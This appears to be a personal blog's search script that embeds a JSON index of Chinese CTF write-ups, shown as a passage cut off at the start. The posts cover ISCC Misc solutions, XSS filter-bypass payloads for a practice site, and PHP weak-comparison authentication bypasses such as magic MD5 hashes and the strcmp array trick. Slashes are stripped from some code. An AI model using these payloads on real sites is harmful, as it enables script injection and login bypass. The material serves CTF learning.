a[100]=&#123;0126,062,0126,0163,0142,0103,0102,0153,0142,062,065,0154,0111,0121,0157,0113,0111,0105,0132,0163,0131,0127,0143,066,0111,0105,0154,0124,0121,060,0116,067,0124,0152,0102,0146,0115,0107,065,0154,0130,062,0116,0150,0142,0154,071,0172,0144,0104,0102,0167,0130,063,0153,0167,0144,0130,060,0113&#125;;\tint i;\tfor(i=0;i&lt;60;i++)\t&#123;\t\tprintf(&quot;%c&quot;,a[i]);\t&#125;\treturn 0; &#125;\n转换之后得：V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K\nbase64解码得： Flag: ISCC{N0_0ne_can_st0p_y0u}\n02 最危险的地方就是最安全的地方是个jpg格式的文件，但是打不开，也没有用binwalk分离…直接尝试用360压缩打开…然后发现了一个文件夹，里面有50张二维码每一张扫出来都差不多，没什么信息，但是发现只有最后一张是个png，查看详细信息，发现最后一张特别大拖进WinHex查看，发现flag\n03 倒立屋用StegSolve打开，发现是lsb隐写选择RGB最低为勾选，就可看到iscc字段，不过flag提交有个脑洞就是要把flag反过来提交。\n04 Keyes’ secret键盘密码，脚本如下1234567891011121314151617181920212223242526272829STR =&apos;WSXCDEWSXCVWSXCVTGBNMJUY,WSXZAQWDVFRQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVT,QWERTYTRFVBGRDXCVBNBVCXSWERFTYUIOJMTGBNMJUMNBVCDRTGHUWSXCDEQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYTRFVGWSXCVGRDXCVBCVGREDQWERTY(TRFVBTYUIOJMTRFVG),QWERTYGRDXCVBQWERTYTYUIOJMEFVTNBVCXSWERFWSXCDEQWERTYTGBNMJUYTRFVGQWERTYTRFVBMNBVCDRTGHUEFVTNBVCXSWERFTYUIOJMTGBNMJUYIUYHNBVNBVCXSWERFTGBNMJUYMNBVCDRTGHUTYUIOJM,QWERTYWSXIUYHNBVQWERTYGRDXCVBQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVTQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFWSXCDETYUIOJMWSXTYUIOJMWSXTGBNMJUYZAQWDVFR.QWERTYTRFVBTYUIOJMTRFVGQWERTYTRFVBTGBNMJUYZAQWDVFRTYUIOJMWSXCDEIUYHNBVTYUIOJMIUYHNBVQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYTGBNMJUIUYHNBVTGBNMJUGRDXCVBWSXCVWSXCVEFVTQWERTYWSXCFEWSXCDEIUYHNBVWSXCVGREDZAQWDVFRWSXCDEWSXCFEQWERTYTYUIOJMTGBNMJUYQWERTYIUYHNBVWSXCDEMNBVCDRTGHUEFVGYWSXCDEQWERTYGRDXCVBIUYHNBVQWERTYGRDXCVBZAQWDVFRQWERTYWSXCDEWSXCFETGBNMJUTRFVBGRDXCVBTYUIOJMWSXTGBNMJUYZAQWDVFRGRDXCVBWSXCVQWERTYWSXCDERGNYGCWSXCDEMNBVCDRTGHUTRFVBWSXIUYHNBVWSXCDEQWERTYTYUIOJMTGBNMJUYQWERTYCVGREDWSXEFVGYWSXCDEQWERTYNBVCXSWERFGRDXCVBMNBVCDRTGHUTYUIOJMWSXTRFVBWSXNBVCXSWERFGRDXCVBZAQWDVFRTYUIOJMIUYHNBVQWERTYWSXCDERGNYGCNBVCXSWERFWSXCDEMNBVCDRTGHUWSXWSXCDEZAQWDVFRTRFVBWSXCDEQWERTYWSXZAQWDVFRQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXZAQWDVFRCVGREDQWERTYGRDXCVBQWERTYXSWEFTYHNGRDXCVBTRFVBRFVGYHNWSXZAQWDVFRWSXCDE,QWERTYGRDXCVBIUYHNBVQWERTYEFVGYWDCFTWSXCDEWSXCVWSXCVQWERTYGRDXCVBIUYHNBVQWERTYTRFVBTGBNMJUYZAQWDVFRWSXCFETGBNMJUTRFVBTYUIOJMWSXZAQWDVFRCVGREDQWERTYGRDXCVBZAQW Salted__Pi 开头，说明是 AES 加密。（我也不知道为什么…..）AES解密网址https:www.sojson.comencrypt_aes.html ,密码是上面拼出来的 “ISCC”，两次解密得到flag\n09 High起来压缩包里是个png形式的文件，拖到WinHex里，发现文件头损坏，发现末尾有个压缩包，修改文件头得到二维码，二维码扫一扫得到一个当铺密码（当铺密码特点：字大部分比较简单，多为横竖组合的汉字）1中口由羊口中中大中中中井\n解密得到1201902252228\n将图片用360压缩打开得到一个01.mp3这里是 MP3隐写，需要用到工具MP3Stego，进入电脑的cmd,先cd到MP3Stego所在的文件夹，把需要分析的mp3文件拖到Decode.exe所在目录里输入命令1Decode.exe -X 01.mp3 -P 201902252228\n（格式：Decode.exe -X 获取隐藏的东西 -P 后面写密码注意：-X -P必须大写。也可以写成Decode.exe -X -P 201902252228 01.mp3）得到这两个文件打开01.mp3.txt，得到html编码解码得到flag\n10 碎纸机打开压缩包得到十张拼图把每一张拖到WinHex里发现这里许多00 中间夹杂着其他字符复制这些十六进制数到notepad中打开之后ctrl+F  查找标记 0调整窗口角度会发现同理，对其余九副图依次分别处理，再将拼图拼在一起得到flag\n11 解密成绩单用IDA打开文件，一直往下拉 发现usename：adminpassword: ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n输入即可得到flag\n","tags":["writeup"],"path":"2019/06/01/2019ISCC-Misc/","external_link":""},{"title":"xss练习题","date":"2019-09-22T09:46:54.000Z","content":"https:xss.haozi.me#0x04 习题答案解析：\n0x00题目：123function render (input) &#123;  return &apos;&lt;div&gt;&apos; + input + &apos;&lt;div&gt;&apos;&#125;\npayload：1&lt;script&gt;alert(1);&lt;script&gt;\n0x01题目：123function render (input) &#123;  return &apos;&lt;textarea&gt;&apos; + input + &apos;&lt;textarea&gt;&apos;&#125;\n闭合标签后输入script标签即可\npayload：1&lt;textarea&gt; &lt;script&gt;alert(1);&lt;script&gt;\n0x02题目：123function render (input) &#123;  return &apos;&lt;input type=&quot;name&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;&#125;\n闭合用”和&gt;闭合input标签即可\npayload：1&quot;&gt;&lt;script&gt;alert(1)&lt;script&gt;\n0x03题目：12345function render (input) &#123;  const stripBracketsRe = [()]g  input = input.replace(stripBracketsRe, &apos;&apos;)  return input&#125;\n题目中过滤了圆括号，可以用反引号来代替。此外，在js中，反引号可以代替圆括号，还可以代替单双引号。\npayload1：1&lt;script&gt;alert`1`;&lt;script&gt;\n也可以可以使用throw来绕过\npayload2：1&lt;svgonload=&quot;window.onerror=eval;throw&apos;=alertx281x29&apos;;&quot;&gt;\n\n这一写法也可以用于其他题中，例如0x00：&lt;svgonload = alert(1);&gt;0x01： &lt;svgonload = alert(1);&gt;\n\n0x04题目：12345function render (input) &#123;  const stripBracketsRe = [()`]g  input = input.replace(stripBracketsRe, &apos;&apos;)  return input&#125;\n这道题将圆括号和反引号都过滤了，也就是我们不能运用模板字符串了。我们想到，我们是否可以使用unicode 编码，来代替圆括号。这种思路没错，但是我们要遇到一个问题就是unicode编码怎么才会被转码实现了，如果只是正常的html编码，unicode编码是不会有任何用的。这里我们可以在了解一下 这个标签，这是一个外部标签，可以显示文字，字符及其他数据。 而 有一个 很重要的特性，便是它可以和xml一样将unicode编码转码进行执行，也就是我们可以通过这个标签执行 unicode编码，关于这个标签的具体介绍，我们可以查看下面这篇资料：https:www.hackersb.cnhacker85.html\npayload1：1&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;script&gt;\n也可以用上一题提到的方法\npayload2：1&lt;svgonload=&quot;window.onerror=eval;throw&apos;=alertx281x29&apos;;&quot;&gt;\n0x05题目：1234function render (input) &#123;  input = input.replace(--&gt;g, &apos;😂&apos;)  return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;&#125;\n&lt;！–可以用 –&gt;和–!&gt;两种方式闭合\npayload：1--!&gt;&lt;script&gt;alert(1);&lt;script&gt;\n0x06题目：1234function render (input) &#123;  input = input.replace(auto|on.*=|&gt;ig, &apos;_&apos;)  return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`&#125;\n这道题过滤了auto字符串 或 on开头=为结尾的字符串或者 &gt; 。\n所以，这里我们想直接 注入 是不成功的，因为，我们的 &gt;会被过滤掉。\n这里，我们看到在input标签注入，我么就可以使用onmousemove这个属性，这个属性是当鼠标移到input这个输入框时，就会被执行的属性。 我们可以注入： οnmοusemοve=alert(1)\n但是，我们这里还有一个问题，就是 onmousemove 这个注入，是以on开头且中间有=，所以我们最终的输入会被正则过滤如下：\n1&lt;input value=1 _alert(1) type=&quot;text&quot;&gt;\nonmosemove=  这段字符串会被过滤，所以这里我们需要想一些办法。\n我们再来仔细查看上面的正则表达式: \n1on.*=\n这个过滤，中间有 小数点：那我们就知道，它不匹配换行符，所以如果我们在  onmousemove = alert(1)之间使用换行符，那么这个正则表达式就会匹配无法成功，于是可以成功绕过\npayload：12onmousemove=alert(1)\n0x07题目：123456function render (input) &#123;  const stripTagsRe = &lt;?[^&gt;]+&gt;gi  input = input.replace(stripTagsRe, &apos;&apos;)  return `&lt;article&gt;$&#123;input&#125;&lt;article&gt;`&#125;\n这道题主要是对  &lt;  和  &gt;进行了过滤，也就是我们不能同时输入  &lt;  和  &gt;。\n所以，这里我们可以运用 浏览器的容错性，当我们少输入一个  &gt;时，浏览器仍然会解释执行我们输入的标签语言。\n所以我们只需要考虑输入一个单标签执行语句。\npayload：1&lt;svgonload =&quot;alert(1)&quot;\n0x08题目：12345678function render (src) &#123;  src = src.replace(&lt;style&gt;ig, &apos;* u574Fu4EBA *&apos;)  return `    &lt;style&gt;      $&#123;src&#125;    &lt;style&gt;  `&#125;\n这道题过滤了标签，可以采用空格或者换行的方法进行绕过。\npayload：12&lt;style &gt;&lt;script&gt;alert(1);&lt;script&gt;\n0x09题目：1234567function render (input) &#123;  let domainRe = ^https?:www.segmentfault.com  if (domainRe.test(input)) &#123;    return `&lt;script src=&quot;$&#123;input&#125;&quot;&gt;&lt;script&gt;`  &#125;  return &apos;Invalid URL&apos;&#125;\ntest(str)函数是判断 str字符串中，是否含有与a匹配的文本，有则返回 true，否则返回 false。\npayload：1https:www.segmentfault.com&quot;&gt;&lt;script&gt;&lt;script&gt;alert(1);&lt;script&gt;\n0x0A题目：12345678910111213141516function render (input) &#123;  function escapeHtml(s) &#123;    return s.replace(&amp;g, &apos;&amp;amp;&apos;)            .replace(&apos;g, &apos;&amp;#39;&apos;)            .replace(&quot;g, &apos;&amp;quot;&apos;)            .replace(&lt;g, &apos;&amp;lt;&apos;)            .replace(&gt;g, &apos;&amp;gt;&apos;)            .replace(g, &apos;&amp;#x2f&apos;)  &#125;  const domainRe = ^https?:www.segmentfault.com  if (domainRe.test(input)) &#123;    return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;script&gt;`  &#125;  return &apos;Invalid URL&apos;&#125;\npayload：1https:www.segmentfault.com.haozi.mej.js\n不明白这个是为什么\n0x0B题目：1234function render (input) &#123;  input = input.toUpperCase()  return `&lt;h1&gt;$&#123;input&#125;&lt;h1&gt;`&#125;\n由于HTML不区分大小写，Javascript严格区分大小写，所以将js的代码html实体编码绕过。也可以引入外部链接来解决。\npayload：1&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;\n0x0C题目：12345function render (input) &#123;  input = input.replace(scriptig, &apos;&apos;)  input = input.toUpperCase()  return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;h1&gt;&apos;&#125;\n因为这道题检查并替换掉了script，所以还可以用上一题的方法1&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;\n也可以双写script绕过\n0x0D题目：12345678function render (input) &#123;  input = input.replace([&lt;&quot;&apos;]g, &apos;&apos;)  return `    &lt;script&gt;           alert(&apos;$&#123;input&#125;&apos;)    &lt;script&gt;  `&#125;\n这里过滤掉了&lt;  “ ‘ ，而且input在注释符后，因为是单行注释，所以可以利用换行来逃逸，后面的’)可以用–&gt;注释。（可以不跟&lt; !– 一起使用emm）\npayload：123)alert(1)--&gt;\n0x0E题目：12345function render (input) &#123;  input = input.replace(&lt;([a-zA-Z])g, &apos;&lt;_$1&apos;)  input = input.toUpperCase()  return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;h1&gt;&apos;&#125;\n服务器将&lt;+第一个字母转换成了&lt;_+大写字母，看似无解，但是经过长时间的搜集，发现了一个ſ字符，这个叫做“长S”。转换后正好为s\npayload：1&lt;ſcript src=&quot;https:www.segmentfault.com.haozi.mej.js&quot;&gt;&lt;script&gt;\n0x0F题目：1234567891011function render (input) &#123;  function escapeHtml(s) &#123;    return s.replace(&amp;g, &apos;&amp;amp;&apos;)            .replace(&apos;g, &apos;&amp;#39;&apos;)            .replace(&quot;g, &apos;&amp;quot;&apos;)            .replace(&lt;g, &apos;&amp;lt;&apos;)            .replace(&gt;g, &apos;&amp;gt;&apos;)            .replace(g, &apos;&amp;#x2f;&apos;)  &#125;  return `&lt;img src onerror=&quot;console.error(&apos;$&#123;escapeHtml(input)&#125;&apos;)&quot;&gt;`&#125;\n先闭合括号才能操作,再注释掉后面的括号\n因为这是在onerror属性里面，所以，实体编码也能解析\npayload：1&apos;);alert(&apos;1 或 &apos;);alert(1) 或 &apos;);alert(1) (&apos;\n0x010题目：1234567function render (input) &#123;  return `&lt;script&gt;  window.data = $&#123;input&#125;&lt;script&gt;  `&#125;\n无过滤,在中直接执行.\npayload：1alert(1)\n0x011题目：123456789101112131415161718192021222324252627282930 from alf.nufunction render (s) &#123;  function escapeJs (s) &#123;    return String(s)            .replace(g, &apos;&apos;)            .replace(&apos;g, &apos;&apos;&apos;)            .replace(&quot;g, &apos;&quot;&apos;)            .replace(`g, &apos;`&apos;)            .replace(&lt;g, &apos;74&apos;)            .replace(&gt;g, &apos;76&apos;)            .replace(g, &apos;&apos;)            .replace(ng, &apos;n&apos;)            .replace(rg, &apos;r&apos;)            .replace(tg, &apos;t&apos;)            .replace(fg, &apos;f&apos;)            .replace(vg, &apos;v&apos;)             .replace(bg, &apos;b&apos;)            .replace(0g, &apos;0&apos;)  &#125;  s = escapeJs(s)  return `&lt;script&gt;  var url = &apos;javascript:console.log(&quot;$&#123;s&#125;&quot;)&apos;  var a = document.createElement(&apos;a&apos;)  a.href = url  document.body.appendChild(a)  a.click()&lt;script&gt;`&#125;\n思路，闭合console.log函数，再构造alert函数弹窗。把”转换成”但是还是在””号内，无影响。然后闭合执行\npayload：11&quot;);alert(&quot;1\n0x012题目：12345 from alf.nufunction escape (s) &#123;  s = s.replace(&quot;g, &apos;&quot;&apos;)  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;script&gt;&apos;&#125;\n匹配”双引号，并替换为”；由于输入点在script标签外，则不能考虑html实体编码；“替换成”，在实际输出中可以在添一个来转义掉第一个绕过；\npayload：123&quot;);alert(1);\n也可以直接闭合最前面的,然后创造一个新的执行alert(1)1&lt;script&gt;&lt;script&gt;alert(1)&lt;script&gt;\n参考：https:blog.csdn.netAlexYoung28articledetails82315538\nhttp:www.youi.xin?p=341\n其实咱也没搞明白xss到底是个啥，咱也不敢问，也不敢说，咱就只敢看着别人的wp刷刷题\n","tags":["writeup","xss"],"path":"2019/09/22/xss练习题/","external_link":""},{"title":"php弱类型比较","date":"2019-07-24T11:37:21.000Z","content":"php是弱类型语言，它含有很多隐式的转换。常见的php弱类型，主要分为类型转换问题和内置函数参数的松散性两类。\n类型转换问题类型转换是无法避免的问题。例如需要将GET或者是POST的参数转换为int类型，或者是两个变量不匹配的时候，PHP会自动地进行变量转换。\n“ == “ 和 “ === “12$a == $b ;$a === $b ;\n=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较\n== 在进行比较的时候，会先将字符串类型转化成相同，再比较\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。\n1234567&lt;?phpvar_dump(&quot;admin&quot;==0); truevar_dump(&quot;1admin&quot;==1); truevar_dump(&quot;admin1&quot;==1) falsevar_dump(&quot;admin1&quot;==0) truevar_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); true?&gt;\n在上述代码中，\n\n“admin”==0比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等。\n\n“1admin”==1比较的时候会将1admin转化成数值1，而”admin1”却被转化成0。\n\n“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等。\n\n\nphp手册中解释如下：\n\n当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内,该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0\n\nHash比较PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。\n攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。\n123&quot;0e132456789&quot;==&quot;0e7124511451155&quot; true&quot;0e123456abc&quot;==&quot;0e1dddada&quot;\tfalse&quot;0e1abc&quot;==0     true\n在进行比较运算时，如果遇到了0ed+这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足0ed+这种模式就不会相等。\n十六进制转换123&quot;0x1e240&quot;==&quot;123456&quot;\t\ttrue&quot;0x1e240&quot;==123456\t\ttrue&quot;0x1e240&quot;==&quot;1e240&quot;\t\tfalse\n当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1e240解析成为十进制是123456，所以与int类型和string类型的123456比较都相等。\n类型转换常见的转换主要就是int转换为string，string转换为int。\nint转string：\n123$var = 5;方式1：$item = (string)$var;方式2：$item = strval($var);\nstring转int：intval()函数。\n对于这个函数，可以先看2个例子。\n123var_dump(intval(&apos;2&apos;))\t2var_dump(intval(&apos;3abcd&apos;))\t3var_dump(intval(&apos;abcd&apos;))\t0\n说明intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。\n官网注释为：\n12345678It seems intval is interpreting valid numeric strings differently between PHP 5.6 and 7.0 on one hand, and PHP 7.1 on the other hand.    &lt;?php    echo intval(&apos;1e5&apos;);    ?&gt;        will return 1 on PHP 5.6 and PHP 7.0,    but it will return 100000 on PHP 7.1.\nbool类型的true比较bool类型的true可以和任意字符串弱类型相等\n123456&lt;?php  if(true == &quot;GETF&quot;)&#123;    echo &quot;OK&quot;;&#125;?&gt;#OK[Finished in 0.3s]\njson绕过 json是一种轻量级的数据交换格式。它采用完全独立于编程语言的文本格式来存储和表示数据。\n\n在 JS 语言中，一切都是对象。因此，任何支持的类型都可以通过 JSON 来表示，例如字符串、数字、对象、数组等。但是对象和数组是比较特殊且常用的两种类型：\n\n对象表示为键值对\n数据由逗号分隔\n花括号保存对象\n方括号保存数组\n\n\n123456789101112&lt;?phpif (isset($_POST[&apos;message&apos;])) &#123;    $message = json_decode($_POST[&apos;message&apos;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key)        echo &quot;flag&quot;;    else        echo &quot;fail&quot;; &#125;else&#123;     echo &quot;~~~~&quot;; &#125;?&gt;\n输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过\nphp的json_decode()函数会根据json数据中的数据类型来将其转换为php中的相应类型的数据，也就是说，如果我们在json中传一个string类型，那么该变量就是string，如果传入的是number，则该变量为number。因此，我们如果传入一个数字，就可以使之相等。网页中的表单可能限制了所有的输入都是string，即使输入数字，传入的东西也是1&#123;&quot;key&quot;:&quot;0&quot;&#125;\n这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：\n1&#123;&quot;key&quot;:0&#125;\n最终payload message={“key”:0}\n内置函数的参数的松散性md5()绕过123456789101112131415161718&lt;?php       if (isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;])) &#123;           $logined = true;        $v1 = $_GET[&apos;v1&apos;];        $v2 = $_GET[&apos;v2&apos;];        if (!ctype_alpha($v1)) &#123;$logined = false;&#125;        if (!is_numeric($v2) ) &#123;$logined = false;&#125;        if (md5($v1) != md5($v2)) &#123;$logined = false;&#125;        if ($logined)&#123;             continuue to do other things        &#125; else &#123;            echo &quot;login failed&quot;        &#125;    &#125;?&gt;\n题目大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句。\n上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过! \n以0e开头的md5值:\n1234567891011121314151617181920212223QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020  s155964671a0e342768416822451524974117254469  s214587387a0e848240448830537924465865611904  s214587387a0e848240448830537924465865611904  s878926199a0e545993274517709034328855841020  s1091221200a0e940624217856561557816327384675  s1885207154a0e509367213418206700842008763514\n\n当传递一个array时，md5()不会报错，但是会无法正确地求出array的md5值，这样也会导致任意两个array的md5值相等。\n\nstrcmp()漏洞绕过 php -v &lt; 5.312345678910&lt;?php $password=&quot;***************&quot; if(isset($_POST[&apos;password&apos;]))&#123; if (strcmp($_POST[&apos;password&apos;], $password) == 0) &#123; echo &quot;Right!!!login success&quot;;n exit(); &#125; else &#123; echo &quot;Wrong password..&quot;; &#125;?&gt;\nstrcmp是比较两个字符串，如果str1&lt; str2 则返回&lt; 0，如果str1大于str2返回&gt;0， 如果两者相等返回0。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。\n我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢？\n12$array=[1,2,3];var_dump(strcmp($array,&apos;123&apos;)); null,在某种意义上null也就是相当于false。\n所以我们传入 password[]=xxx 可以绕过，是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等。payload: password[]=xxx(eg:password[]=admin) \nswitch()123456789101112&lt;?php$a=&quot;4admin&quot;;switch ($a) &#123; case 1: echo &quot;fail1&quot;; break; case 2: echo &quot;fail2&quot;; break; case 3: echo &quot;fail3&quot;; break; case 4: echo &quot;sucess&quot;; 结果输出success; break; default: echo &quot;failall&quot;; break;&#125;?&gt;\nswitch()会将参数进行类型转换，在上述代码中将4admin转换成4，于是输出success。\nin_array()在PHP手册中，in_array()函数的解释是bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ),如果strict参数没有提供，那么in_array就会使用松散比较来判断$needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同。\n123$array=[0,1,2,&apos;3&apos;];var_dump(in_array(&apos;abc&apos;, $array));  truevar_dump(in_array(&apos;1bc&apos;, $array));\ttrue\n可以看到上面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。array_search()与in_array()也是一样的问题。\n\n参考：https:www.secpulse.comarchives69529.htmlhttps:blog.spoock.com20160625weakly-typed-security\n","tags":["php"],"path":"2019/07/24/php弱类型比较/","external_link":""}]';

	s = s.replace(/\\n/g, "\\n")
               .replace(/\\'/g, "\\'")
               .replace(/\\"/g, '\\"')
               .replace(/\\&/g, "\\&")
               .replace(/\\r/g, "\\r")
               .replace(/\\t/g, "\\t")
               .replace(/\\b/g, "\\b")
               .replace(/\\f/g, "\\f")

// remove non-printable and other non-valid JSON chars
	s = s.replace(/[\u0000-\u0019]+/g,"");
	var list = JSON.parse(s);
	var fuse = new Fuse(list, options);
	var el = document.getElementById('search-form');
	var newBox = $('.Card-archive').first().clone();
	el.oninput = function(event){
		var searchText = el.value;
		var result = fuse.search(searchText);
		$('.archive-cards .Card-archive').remove();
		for(var i in result){
			var anotherBox = newBox.clone();
			var dateStr = new Date(result[i].date);
			anotherBox.css('display','flex');
			var url = "";
			if(result[i].external_link !== ""){
				url = result[i].external_link;
			}else{
				url = '/' + result[i].path;
			}

			anotherBox.find('.Card-title a').text(result[i].title).attr('href', url);
			anotherBox.find('.Card-date').text(dateStr.toDateString());
			anotherBox.appendTo('.archive-cards');
		}
	}
